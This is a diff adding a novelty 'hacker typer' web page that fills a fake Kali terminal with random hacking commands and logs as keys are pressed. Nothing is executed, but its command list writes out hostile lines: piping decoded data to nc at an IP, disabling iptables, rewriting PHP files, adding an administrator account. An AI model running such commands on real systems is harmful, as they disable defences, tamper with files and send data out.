@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OS: Kali-2025.04 | Unauthorized Access Protocol</title>
+<!-- Load Tailwind CSS -->
+<script src="https://cdn.tailwindcss.com"></script>
+<!-- Set Inter font -->
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Space+Mono:ital,wght@0,400;0,700;1,400;1,700&display=swap');
+body {
+font-family: 'Space Mono', monospace; /* Monospace is essential for terminal look */
+cursor: none; /* Hide the cursor for a more intense terminal feel */
+/* Add a subtle screen flicker effect */
+animation: flicker 0.1s infinite alternate;
+}
+
+@keyframes flicker {
+0% { opacity: 1; }
+100% { opacity: 0.98; }
+}
+
+/* Custom scrollbar to match the theme */
+.terminal-output::-webkit-scrollbar {
+width: 8px;
+}
+.terminal-output::-webkit-scrollbar-track {
+background: #111;
+}
+.terminal-output::-webkit-scrollbar-thumb {
+background-color: #0d9488; /* Teal-700 */
+border-radius: 20px;
+border: 2px solid #111;
+}
+</style>
+</head>
+<body class="bg-black text-teal-400 min-h-screen p-4 overflow-hidden">
+
+<!-- Screen Container -->
+<div id="terminal-screen" class="terminal-output w-full h-screen max-h-screen overflow-y-auto text-xs md:text-sm selection:bg-teal-700 selection:text-black transition-opacity duration-300">
+
+<!-- Static Boot Up Text -->
+<div id="boot-text">
+<p class="text-teal-500 font-bold mb-4">
+[ INIT ] KERNEL 6.8.0-kali-1-amd64 booting...
+</p>
+<p class="text-teal-500">
+[ OK ] Found root device /dev/sda1.
+</p>
+<p class="text-teal-500">
+[ OK ] Starting Network Manager...
+</p>
+<p class="text-white font-mono mt-4">
+Kali Linux 2025.04 (ID: 4A7B)
+</p>
+<p class="text-white font-mono mb-6">
+Press **ANY KEY** to initiate the high-speed penetration protocol.
+</p>
+
+<!-- Initial Prompt (Will be replaced instantly) -->
+<div id="live-prompt-wrapper" class="mt-1">
+<span class="text-green-500">root@system</span>:<span class="text-blue-400">/opt/protocol</span><span class="text-white"># </span><span id="current-command" class="text-white leading-tight">_</span>
+</div>
+</div>
+
+</div>
+
+<script>
+// Global state for Firebase (required by environment, though not used for this static app)
+const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id';
+const firebaseConfig = typeof __firebase_config !== 'undefined' ? JSON.parse(__firebase_config) : {};
+const initialAuthToken = typeof __initial_auth_token !== 'undefined' ? __initial_auth_token : '';
+
+const terminalScreen = document.getElementById('terminal-screen');
+const bootText = document.getElementById('boot-text');
+
+// --- Fake Hacking Data Structures ---
+
+const randomCommands = [
+"nmap -v --privileged -p 1-65535 10.0.0.1/24 -oX full_scan.xml",
+"aircrack-ng -a 2 -b 00:11:22:33:44:55 /root/wpa.cap -w /usr/share/wordlists/rockyou.txt",
+"msfconsole -r exploit/multi/handler",
+"curl -X POST -d @payload.json https://target.api/v1/user/auth",
+"git clone --depth 1 https://darkrepo.net/project_X_DASH.git",
+"systemctl stop iptables && systemctl disable iptables",
+"find /var/www/html/ -type f -name '*.php' -exec sed -i 's/exit/new_func/g' {} \\;",
+"echo 'U2VjcmV0IERhdGEgLSBERUNPTlQ=' | base64 -d | nc -w 3 192.168.1.1 8080"
+];
+
+// Generates a multi-line block of realistic-looking code, logs, and errors
+function generateFakeCodeBlock() {
+const blockLength = Math.floor(Math.random() * 6) + 5; // 5 to 10 lines
+let html = '';
+const lines = [
+// Python/Code snippets
+'>>> result = db.query("SELECT * FROM users WHERE status=1")',
+'// Function: validate_checksum(data_packet); return true;',
+'def decrypt_stream(key): # Initializing AES-256 cipher mode',
+'C:\\> copy target_config.dat \\\\192.168.1.10\\share',
+'C:\\> net user administrator password123 /add',
+'$ sshpass -p "defaultP@ss" ssh user@10.0.0.2',
+'Connecting to host 172.16.1.10... Status: ESTABLISHED',
+'Received 4096 bytes of encrypted payload. Hash: 9e08...',
+'File transfer protocol initiated (mode: secure_tunnel)',
+'--- BEGIN AUTH TOKEN BLOCK (JWT) ---',
+'if (buffer.length > MAX_SIZE) { throw new Error("Buffer overflow"); }',
+'$ git commit -m "Exploit: Injection Vector 4.1 Complete"',
+// Status/log messages
+'[ OK ] Service sshd restarted successfully.',
+'[+] Enumerating connected devices... (23 hosts found)',
+'[!] ACCESS DENIED: Insufficient credentials for user root on target 10.0.0.5',
+'[!] WARNING: High latency detected on port 22. Retrying in 5 seconds...',
+'[*] Launching proxy chains via Tor network... 9 hops established.',
+'SYSTEM: Processing block 5834/6000... Success. Latency: 4ms.',
+'[+] Payload integrity check passed (CRC32: 9A3E4D).',
+// Hex dump style
+'0xAE0B98: E8 0B 00 00 00 89 05 80 | ........',
+'0xAE0BA0: 3E 01 00 85 C0 75 08 C7 | >....u..',
+];
+
+for (let i = 0; i < blockLength; i++) {
+const line = lines[Math.floor(Math.random() * lines.length)];
+
+// Add color variation based on content
+let colorClass = 'text-teal-400';
+if (line.includes('>>>') || line.includes('def') || line.includes('sshpass')) colorClass = 'text-green-500';
+else if (line.includes('C:\\>') || line.includes('$')) colorClass = 'text-white';
+else if (line.includes('[!]') || line.includes('ACCESS DENIED') || line.includes('Error')) colorClass = 'text-red-400 font-bold';
+else if (line.includes('[*]')) colorClass = 'text-yellow-400';
+else if (line.startsWith('0x')) colorClass = 'text-gray-600'; // Hex dump
+
+html += `<p class="${colorClass} leading-tight transition-opacity duration-100 ease-in-out">${line} </p>`;
+}
+return html;
+}
+
+// Scrolls the terminal view to the bottom
+function scrollToBottom() {
+terminalScreen.scrollTop = terminalScreen.scrollHeight;
+}
+
+// Generates and appends a fresh, new prompt line
+function appendNewPrompt() {
+bootText.insertAdjacentHTML('beforeend', `
+<div id="live-prompt-wrapper" class="mt-1">
+<span class="text-green-500">root@system</span>:<span class="text-blue-400">/opt/protocol</span><span class="text-white"># </span><span id="current-command" class="text-white leading-tight animate-pulse">_</span>
+</div>
+`);
+}
+
+// Main function called on every key press (GeekTyper effect)
+function handleKey(event) {
+// Prevent default browser behavior for common keys
+if (event.key.length === 1 || event.key === 'Space' || event.key === 'Enter') {
+event.preventDefault();
+}
+
+// 1. Remove the old, waiting prompt
+const lastPrompt = bootText.lastElementChild;
+if (lastPrompt && lastPrompt.id === 'live-prompt-wrapper') {
+// Replace the waiting underscore with a random completed command
+const randomCmd = randomCommands[Math.floor(Math.random() * randomCommands.length)];
+lastPrompt.innerHTML = `<span class="text-green-500">root@system</span>:<span class="text-blue-400">/opt/protocol</span><span class="text-white"># </span><span class="text-white">${randomCmd}</span>`;
+}
+
+// 2. Append the massive block of generated fake code/logs
+bootText.insertAdjacentHTML('beforeend', generateFakeCodeBlock());
+
+// 3. Append the brand new, empty prompt line
+appendNewPrompt();
+
+// 4. Scroll to the bottom to show the new content
+scrollToBottom();
+}
+
+// Event listener for keyboard input
+window.addEventListener('keydown', handleKey);
+window.addEventListener('mousedown', handleKey); // Also trigger on mouse click
+
+// Initial scroll and fade-in
+window.onload = () => {
+// Make the screen slightly opaque initially and fade in for dramatic effect
+terminalScreen.style.opacity = '0';
+setTimeout(() => {
+terminalScreen.style.opacity = '1';
+scrollToBottom();
+}, 100);
+};
+</script>
+</body>
+</html>
